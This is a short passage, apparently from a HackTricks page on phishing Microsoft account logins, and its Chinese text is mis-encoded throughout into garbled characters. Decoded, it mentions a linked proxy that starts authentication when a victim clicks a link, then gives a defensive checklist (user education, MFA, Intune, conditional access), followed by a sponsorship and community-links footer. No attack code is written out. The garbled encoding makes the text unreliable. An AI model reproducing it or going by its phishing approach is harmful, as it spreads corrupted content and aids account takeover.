å¦ä¸€ç§æ–¹æ³•æ˜¯å®ç°[ä»£ç†](https://gist.github.com/Mr-Un1k0d3r/afef5a80cb72dfeaa78d14465fb0d333)ï¼Œå½“é“¾æ¥è¢«ç‚¹å‡»æ—¶å¼€å§‹èº«ä»½éªŒè¯ï¼ˆæ„Ÿè°¢[@MrUn1k0d3r](https://twitter.com/MrUn1k0d3r)ï¼‰ã€‚ç„¶è€Œï¼Œè¿™ç§æ–¹å¼ä¼šä¸§å¤±ä½¿ç”¨åˆæ³•çš„microsoft.comç½‘å€çš„ä¼˜åŠ¿ã€‚

é’“é±¼æ´»åŠ¨ç”Ÿå­˜çš„æ£€æŸ¥æ¸…å•ï¼š

1. å‘ç”¨æˆ·**æä¾›æœ‰å…³ä¿¡æ¯å®‰å…¨å’Œé’“é±¼çš„æ•™è‚²** :woman\_teacher:
2. ä½¿ç”¨å¤šé‡èº«ä»½éªŒè¯ï¼ˆMFAï¼‰ :iphone:
3. ä½¿ç”¨Intune :hammer\_and\_wrench: å’Œæ¡ä»¶è®¿é—®ï¼ˆCAï¼‰ :stop\_sign:

\






<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—å¥½å¤„ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**ï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
